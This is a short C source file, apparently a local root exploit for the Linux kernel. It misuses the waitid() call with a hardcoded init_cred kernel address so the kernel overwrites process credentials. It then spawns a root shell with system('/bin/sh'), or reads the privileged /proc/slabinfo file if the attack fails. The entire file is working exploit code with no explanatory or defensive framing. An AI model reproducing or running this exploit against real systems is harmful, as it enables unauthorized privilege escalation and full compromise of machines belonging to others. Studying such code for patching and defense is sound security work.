#include <stdio.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>

// ffff0000096fe0d8 D init_cred 
#define INIT_CRED 0xffff0000096fe0d8

int main(void)
{
    int fd;
    char buff[0x10];    
    int *ptr = (int *)INIT_CRED;

    int pid = fork();

    if (pid == 0)
    {
        sleep(2);
        exit(-1);
    } else if (pid > 0)
    {
        waitid(P_PID, pid, (void *)(ptr + 1), WNOHANG );
    }
    printf("----- uid %d  euid %d -----\n", getuid(), geteuid());

    if (getuid() == 0)
    {
        puts("done!");
        system("/bin/sh");
    }
    else
    {
        printf("----- uid %d  euid %d -----\n", getuid(), geteuid());
        fd=open("/proc/slabinfo", O_RDONLY);
        if (fd<0)
        {
            perror("[-] Open slabinfo error!");
            exit(-1);
        }
        read(fd, buff, 0x10);
        printf("----- uid %d buff %s -----\n", getuid(), buff);
        close(fd);
    }


    return 0;
}
